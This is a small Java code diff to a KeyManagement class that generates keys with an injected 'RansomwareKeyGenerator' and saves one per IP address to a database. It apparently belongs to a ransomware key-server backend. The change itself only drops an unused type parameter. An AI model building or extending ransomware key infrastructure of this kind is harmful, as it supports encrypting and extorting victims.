@@ -15,7 +15,7 @@ public class KeyManagement {
 	@Inject
 	private RansomwareKeyGenerator generator;
 
-	public <T> CryptoKey createAndSaveKey(String encalgo, String ip)
+	public CryptoKey createAndSaveKey(String encalgo, String ip)
 			throws AlgorithmNotFoundException, NoSuchAlgorithmException {
 
 		return (repository.save(new CryptoKey(ip, (Key) generator.generateKey(encalgo), encalgo))); // Save to DB
